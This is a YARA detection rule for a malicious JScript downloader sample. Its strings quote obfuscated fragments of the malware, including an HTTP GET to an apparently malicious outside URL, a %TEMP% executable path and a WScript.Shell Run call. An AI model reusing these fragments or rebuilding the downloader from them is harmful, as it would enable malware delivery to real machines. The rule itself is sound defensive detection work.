rule sig_20160328_d57112bb62079847b3bfdcec192b3a17 {
  meta:
    description = "datamaliciousorder - file 20160328_d57112bb62079847b3bfdcec192b3a17.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6ed0982928297635f0097963df971c6e4c9e75a82ebeb24782dc0c9f8e5bfd0c"

  strings:
    $s1  = "function Esihznk() {return Utfeysuy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zoQD5FWoEYMiEC.exe\";};" fullword ascii
    $s2  = "Nysgcnajhi[Udnqvt](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Ggigcflmvd](Moblfkg() * 11)} while (Nysgcnajhi[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Utfeysuy = function Qnewp() {return WScript[Etdualdsh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hdbxua(Oatyjt, Fmbhwg){return Oatyjt - Fmbhwg;};" fullword ascii
    $s6  = "function Thbsbannho(Ioumnal){Utfeysuy[\"Run\"](Ioumnal, Qbjgkf, Qbjgkf);};" fullword ascii
    $s7  = "function Wnrcifczpz() {return ((Ewsutlc == true) && (Ewsutlc == Ecfvcj)) ? 1 : Qbjgkf;};" fullword ascii
    $s8  = "function Moblfkg(){return 22;};" fullword ascii
    $s9  = "return Hdbxua(Lxjwfdm, Wiccxtzpjt);" fullword ascii
    $s10 = "function Ldtrfbd(){return Etdualdsh;};" fullword ascii
    $s11 = " while (Ahbwedjy){" fullword ascii
    $s12 = "var Kmkzkgdfbs = false;" fullword ascii
    $s13 = "Ewsutlc = true; " fullword ascii
    $s14 = "Ecfvcj = true; " fullword ascii
    $s15 = "function Zqxlsmvl(Kywjurutnq) {var Emmbkct = (1, 2, 3, 4, 5, Kywjurutnq); return Emmbkct;};" fullword ascii
    $s16 = "var Ivizwwg = new this[\"Date\"]();" fullword ascii
    $s17 = "function Zjygktm(){return Ekfrkcxx;};" fullword ascii
    $s18 = "var Ewsutlc = false;" fullword ascii
    $s19 = "function Ldybsnbyq()" fullword ascii
    $s20 = "var Ecfvcj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}